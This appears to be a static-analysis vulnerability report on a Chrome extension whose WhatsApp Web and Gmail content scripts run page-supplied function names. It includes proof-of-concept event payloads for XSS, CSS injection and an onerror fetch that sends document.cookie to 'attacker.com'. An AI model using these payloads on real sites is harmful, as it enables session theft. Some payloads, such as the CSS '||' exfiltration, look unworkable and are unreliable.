# CoCo Analysis: pblpdhdohbbgoodcdnjiiinnhphhdlcn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 16 (all related to eval-like execution via window[functionName])

---

## Sink: document_eventListener_callFunctionfromScript → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pblpdhdohbbgoodcdnjiiinnhphhdlcn/opgen_generated_files/cs_0.js
Line 479 document.addEventListener("callFunctionfromScript", function(event){
Line 480 window[event.detail.functionName](event.detail.params);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pblpdhdohbbgoodcdnjiiinnhphhdlcn/opgen_generated_files/cs_1.js
Line 483 document.addEventListener("callFunctionfromScript", function(event){
Line 484 window[event.detail.functionName](event.detail.params);

Multiple eval-like sinks detected with attacker-controlled params flowing to:
- Line 160: this[i] = array_in[i] (JQ_obj constructor)
- Line 75-76: a[0] check and a.substring() operations
- Line 627: ifrm.style.cssText = params.css
- Line 628: document.querySelectorAll(params.className)
- Line 626: ifrm.setAttribute('src', params.src)
- Line 625: ifrm.setAttribute('id', params.id)
- Line 562: width: ${params.width}px
- Line 612: src=${params.urlimg}
- Line 617: src=${params.urlimgLogo}

**Code:**

```javascript
// cs_0.js and cs_1.js (content scripts on WhatsApp/Gmail/Fixdigital)
document.addEventListener("callFunctionfromScript", function(event){
    window[event.detail.functionName](event.detail.params); // ← attacker-controlled
}, false);

// Available functions that can be called:
function loadIframe(params){
  var ifrm = document.createElement('iframe');
  ifrm.setAttribute('id', params.id); // ← attacker-controlled
  ifrm.setAttribute('src', params.src); // ← attacker-controlled
  ifrm.style.cssText = params.css; // ← attacker-controlled CSS injection
  var targetEls = document.querySelectorAll(params.className); // ← attacker-controlled selector
  if (targetEls.length === 0) {
    console.error('loadIframe fail', params.className, targetEls);
    return;
  }
  targetEls[0].appendChild(ifrm);
}

function createLoadPage(params){
  // Template literal with attacker-controlled width
  var style = `
    .startPage{
      height:100%;
      width: ${params.width}px; // ← attacker-controlled, template literal injection
    }
  `;
  // HTML with attacker-controlled image URLs
  var html = `
    <img class="logo.img" src="${params.urlimg}" alt="FixDigital Logo">
    <img class="logo.img" src="${params.urlimgLogo}" alt="FixDigital Logo">
  `;
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (document.addEventListener)

**Attack:**

```javascript
// From malicious webpage on whatsapp.com or mail.google.com
var event = new CustomEvent("callFunctionfromScript", {
    detail: {
        functionName: "loadIframe",
        params: {
            id: "malicious",
            src: "javascript:alert(document.domain)", // XSS via javascript: URL
            css: "position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999",
            className: "body"
        }
    }
});
document.dispatchEvent(event);

// Or CSS injection attack
var event2 = new CustomEvent("callFunctionfromScript", {
    detail: {
        functionName: "loadIframe",
        params: {
            id: "steal",
            src: "https://attacker.com",
            css: "background:url('https://attacker.com/steal?data='||document.body.innerHTML)",
            className: "body"
        }
    }
});
document.dispatchEvent(event2);

// Or template literal injection in createLoadPage
var event3 = new CustomEvent("callFunctionfromScript", {
    detail: {
        functionName: "createLoadPage",
        params: {
            width: "100}; background: url('https://attacker.com/exfil'); {",
            urlimg: "x\" onerror=\"alert(document.domain)",
            urlimgLogo: "x\" onerror=\"fetch('https://attacker.com/steal?cookie='+document.cookie)"
        }
    }
});
document.dispatchEvent(event3);
```

**Impact:** Arbitrary JavaScript execution in the context of WhatsApp Web (https://web.whatsapp.com) or Gmail (https://mail.google.com). The attacker can:
1. Create iframes with javascript: URLs for XSS
2. Inject arbitrary CSS to perform CSS injection attacks and data exfiltration
3. Inject malicious attributes into dynamically created HTML elements
4. Execute arbitrary code via template literal injection in style tags and HTML content
5. Steal sensitive user data from WhatsApp conversations or Gmail emails
6. Perform actions on behalf of the user on these privileged domains
